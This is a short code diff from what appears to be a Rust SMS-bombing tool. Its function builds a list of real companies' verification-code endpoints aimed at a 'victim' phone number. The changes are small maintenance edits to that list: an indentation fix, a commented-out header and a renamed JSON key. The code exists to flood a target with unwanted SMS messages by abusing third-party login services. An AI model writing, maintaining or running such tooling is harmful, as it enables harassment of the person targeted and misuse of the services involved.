@@ -261,6 +261,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
 //                service
 //                    .headers
 //                    .insert("Priority", r#"u=0"#.parse().unwrap());
+//                service.headers.insert("TE", r#"trailers"#.parse().unwrap());
 //
 //                let mut phone = victim.phone.clone();
 //                phone.format(WithPlus);
@@ -276,7 +277,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                     name: "Zhivika".to_string(),
                     service_type: ServiceType::Sms,
                     method: Method::POST,
-                      url: "https://a.zhivika.ru/api/auth/codeRequest?city=61".to_string(),
+                    url: "https://a.zhivika.ru/api/auth/codeRequest?city=61".to_string(),
                     headers: HeaderMap::new(),
                     body_type: BodyType::JSON,
                     body: Default::default(),
@@ -344,7 +345,7 @@ pub fn construct_services_list(victim: Victim) -> Vec<Service> {
                 let mut phone = victim.phone.clone();
                 phone.format(WithPlus);
                 service.body = json!({
-                    "Phone": phone.phone,
+                    "phone": phone.phone,
                     "DevMode": false
                 });
 
